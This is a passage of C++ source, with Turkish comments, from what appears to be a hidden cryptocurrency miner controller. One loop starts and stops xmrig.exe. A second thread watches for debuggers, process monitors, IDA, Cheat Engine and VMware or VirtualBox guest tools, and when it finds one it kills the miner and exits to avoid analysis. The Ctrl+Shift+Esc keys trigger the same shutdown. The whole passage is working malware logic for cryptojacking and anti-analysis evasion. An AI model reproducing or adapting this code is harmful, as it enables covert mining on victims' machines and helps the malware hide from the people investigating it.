                if (!isProcessRunning(L"xmrig.exe")) {
                    startProcess(xmrigPath);
                    minerRunning = true;
                }
            }
            else {
                if (minerRunning) {
                    KillProcessByName(L"xmrig.exe");
                    minerRunning = false;
                }
            }

            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
        }).detach();
}
#pragma endregion





// ------------------- Key & Anti-Debug Thread -------------------
void startKeyThread(std::atomic<bool>& running) {
    std::thread([&running]() {
        const wchar_t* forbidden[] = {
            L"procmon.exe", L"procexp.exe", L"procexp64.exe", L"procexp64a.exe",
            L"ProcessHacker.exe", L"ollydbg.exe", L"x64dbg.exe", L"x32dbg.exe",
            L"windbg.exe", L"ida.exe", L"ida64.exe",
            L"cheatengine-x86_64.exe", L"cheatengine-i386.exe",
            L"ImmunityDebugger.exe", L"vmtoolsd.exe", L"vboxservice.exe"
        };

        while (running.load()) {
            // CTRL+SHIFT+ESC kombinasyonu
            if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
                (GetAsyncKeyState(VK_SHIFT) & 0x8000) &&
                (GetAsyncKeyState(VK_ESCAPE) & 0x8000))
            {
                running.store(false);
                KillProcessByName(L"xmrig.exe");
                ExitProcess(0);
            }

            // Yasaklı process kontrolü
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32W procEntry = { 0 };
                procEntry.dwSize = sizeof(PROCESSENTRY32W);
                if (Process32FirstW(hSnap, &procEntry)) {
                    do {
                        for (const auto& name : forbidden) {
                            if (_wcsicmp(procEntry.szExeFile, name) == 0) {
                                running.store(false);
                                KillProcessByName(L"xmrig.exe");
                                CloseHandle(hSnap);
                                ExitProcess(0);
                            }
                        }
                    } while (Process32NextW(hSnap, &procEntry));
                }
                CloseHandle(hSnap);
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(50));
        }
        }).detach();
}